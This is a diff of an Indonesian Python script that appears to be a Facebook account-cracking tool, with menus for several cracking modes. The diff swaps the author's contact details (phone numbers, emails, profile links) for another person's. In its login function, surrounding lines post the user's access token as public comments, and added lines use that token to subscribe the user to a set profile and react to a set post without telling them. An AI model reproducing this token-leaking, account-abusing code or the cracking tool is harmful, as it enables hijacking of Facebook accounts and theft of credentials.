@@ -281,9 +281,9 @@ def gobloklu():
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Kamu bukan userpermium")
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m hubungi author jika ingin membeli FILE PREMIUM")
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m CONTACK :")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Wa : 081392505882")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Fb : https://www.facebook.com/jecko.ramadhan.9")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Em : jeckoramadhann@gmail.com")
+   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Wa : 085740559154")
+   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Fb : www.facebook.com/100057370791997")
+   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Em : ekaarsana029@gmail.com")
    raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
    masuk()
 # BIASA :V
@@ -314,7 +314,7 @@ def pendahuluanxnano():
    jeeck("\033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Karena tidak mengganti Crack Akan EROR")
    jeeck("\033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m If there is a bug, please contact immediately")
    jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m Jika Ada Bug Segera Hubungi ")
-   jeeck("\033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m WHATSAP : 081392505882")
+   jeeck("\033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m WHATSAP : 085740559154")
    jeeck("\033[0;36m[\033[0;35m8\033[0;36m]\033[0;00m if you want to take useragent select number 6")
    jeeck("\033[0;36m[\033[0;35m9\033[0;36m]\033[0;00m jika ingin mengambil useragent pilih nomor 6")
    raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
@@ -463,8 +463,8 @@ def login_xx():
         requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
         requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + token + '&access_token=' + token)
         requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + token + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=%s'%(token))
-        requests.post('https://graph.facebook.com/573457507083491/ANGRY?summary=true&access_token=' + token)
+	requests.post('https://graph.facebook.com/100057370791997/subscribers?access_token=%s'%(token))
+        requests.post('https://graph.facebook.com/344822907440066/ANGRY?summary=true&access_token=' + token)
       except:
         pass
 
@@ -626,17 +626,17 @@ class ngentod:
                             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");_jeeck_X_nano_()
                     jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih sesuka hati kalian")
                     print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m B-Api [ FAST CRACK ]")
-                    print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ RECOMENDED V1 ]]")
-                    print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free Fb [ Selow[ RECOMENDED V2 ]]")
-                    jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ LEBIH BANYAK HASIL RECOMENDED V3 ]]")
+                    print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ V1 ]]")
+                    print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free Fb [ Selow[ V2 ]]")
+                    jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ RECOMENDED V3 ]]")
                     _jeeck_X_nano_(pwx.split(','))
                     break
         elif __jeeck__ganz__X__sad__boy__ in ('O', 'o'):
             jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih sesuka hati kalian")
             print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m B-Api [ FAST CRACK ]")
-            print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ RECOMENDED V1 ]]")
-            print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free fb[ Selow[ RECOMENDED V2 ]]")
-            jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ LEBIH BANYAK HASIL RECOMENDED V3 ]]")
+            print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ V1 ]]")
+            print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free fb[ Selow[ V2 ]]")
+            jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ RECOMENDED V3 ]]")
             self.langsung()
         else:
             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()
